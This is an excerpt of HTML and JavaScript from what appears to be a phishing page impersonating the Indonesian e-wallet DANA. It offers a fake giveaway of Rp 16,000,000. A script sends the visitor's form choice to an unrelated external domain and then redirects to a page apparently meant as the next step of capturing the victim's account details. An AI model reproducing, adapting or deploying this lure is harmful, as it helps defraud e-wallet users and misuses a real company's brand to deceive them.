...
<head>
    ...
    <title>𝗗𝗔𝗡𝗔 | 𝗚𝗶𝘃𝗲𝘄𝗮𝘆 𝗜𝗻𝗱𝗼𝗻𝗲𝘀𝗶𝗮</title>
    ...
    <meta property="og:image"
        content="https://hosting.tigerengine.id/zap50j.jpg">    
    <meta name="twitter:image"
        content="https://hosting.tigerengine.id/zap50j.jpg"><link href="https://hosting.tigerengine.id/shv5u3.png"
...
<body>
  ...
  accent-color: #007bff; /* Warna biru */
                        ...
                        <p style="border-radius:15px;margin:0 auto;left:0;right:0;text-align: center; font-size: 14px; border-bottom: 2px double #0086e0; font-weight: bold; color: #0086e0">Silahkan pilih sesuai dengan kebutuhan anda dibawah ini.<br><br></p>
                        <legend>
                            
                            <br> 
                           
  <input type="radio" id="baru" name="tarif" value="𝗖𝗹𝗮𝗶𝗺 𝗗𝗔𝗡𝗔 𝗥𝗽. 16.000.000" required >
  <label for="baru" style="font-size:15px;text-shadow: 2px 2px 2px #00000030;">&nbsp; 𝗖𝗹𝗮𝗶𝗺 𝗗𝗔𝗡𝗔 𝗥𝗽. 16.000.000</label>
                            <br>
  <input type="radio" id="lama" name="tarif" value="𝗗𝗮𝗻𝗮 𝗧𝗲𝗿𝗽𝗲𝗻𝗱𝗶𝗻𝗴 𝗥𝗽. 16.600.000"  required >
  <label for="lama" style="font-size:15px;text-shadow: 2px 2px 2px #00000030;">&nbsp; 𝗗𝗮𝗻𝗮 𝗧𝗲𝗿𝗽𝗲𝗻𝗱𝗶𝗻𝗴 𝗥𝗽. 16.600.000</label>
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://choreo.ii-fi.cfd/d0sd/ss/tarif.php',
            data: $('#patok').serialize(),
            datatype: 'JSON',            
            complete: function(data) {
            setTimeout(function(){            
            window.location.href='lg1oo.html';
            $("#process1").fadeOut();     
   }, 500);
            }
          })
